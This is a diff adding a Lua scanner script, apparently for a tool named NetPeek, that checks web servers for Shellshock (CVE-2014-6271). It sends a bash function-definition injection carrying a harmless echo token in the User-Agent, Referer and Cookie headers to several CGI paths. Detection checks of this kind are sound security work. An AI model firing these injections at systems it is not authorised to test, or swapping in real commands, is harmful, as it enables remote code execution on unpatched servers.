@@ -1,0 +1,79 @@
+description = "Check for Shellshock via CGI-style header injection (CVE-2014-6271)"
+author = "NetPeek Team"
+license = "MIT"
+categories = {"vuln", "intrusive"}
+portrule_ports = {80, 443, 8080, 8443}
+
+portrule = function(host, port)
+    return port.service == "http" or port.service == "https" or
+           port.number == 80 or port.number == 443 or port.number == 8080 or port.number == 8443
+end
+
+local function scheme_for_port(port)
+    if port.service == "https" or port.number == 443 or port.number == 8443 then
+        return "https"
+    end
+    return "http"
+end
+
+action = function(host, port)
+    local vuln = require "vuln"
+    local token = "SHELLSHOCK_NETPEEK_" .. tostring(port.number) .. "_" .. tostring(string.len(host.ip or ""))
+    local target = string.format("%s:%d", host.ip, port.number)
+    local scheme = scheme_for_port(port)
+    local paths = {"/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/admin.cgi", "/"}
+
+    local probe_headers = {
+        ["User-Agent"] = "() { :;}; echo; echo " .. token,
+        ["Referer"] = "() { :;}; echo; echo " .. token,
+        ["Cookie"] = "() { :;}; echo; echo " .. token,
+    }
+
+    for _, path in ipairs(paths) do
+        local url = string.format("%s://%s:%d%s", scheme, host.ip, port.number, path)
+        local response, err = vuln.http_probe(url, "GET", {
+            timeout_ms = 5000,
+            verify_ssl = false,
+            headers = probe_headers,
+        })
+
+        if response then
+            local body = tostring(response.body or "")
+            local status = tonumber(response.status or 0) or 0
+            if string.find(body, token, 1, true) then
+                return vuln.result({
+                    check = "http-shellshock",
+                    cve = "CVE-2014-6271",
+                    vulnerable = true,
+                    confidence = "high",
+                    severity = "high",
+                    target = target,
+                    evidence = string.format("token_reflected_in_body path=%s status=%d", path, status),
+                    notes = "Injected bash function token was executed/reflected",
+                })
+            end
+        elseif err and string.find(string.lower(tostring(err)), token:lower(), 1, true) then
+            return vuln.result({
+                check = "http-shellshock",
+                cve = "CVE-2014-6271",
+                vulnerable = true,
+                confidence = "medium",
+                severity = "high",
+                target = target,
+                evidence = "token_seen_in_error_response path=" .. path,
+                notes = "Probe token surfaced during server error handling",
+            })
+        end
+    end
+
+    return vuln.result({
+        check = "http-shellshock",
+        cve = "CVE-2014-6271",
+        vulnerable = false,
+        confidence = "medium",
+        severity = "high",
+        target = target,
+        evidence = "no_shellshock_token_reflection",
+        notes = "No tested CGI endpoint reflected or executed probe token",
+    })
+end
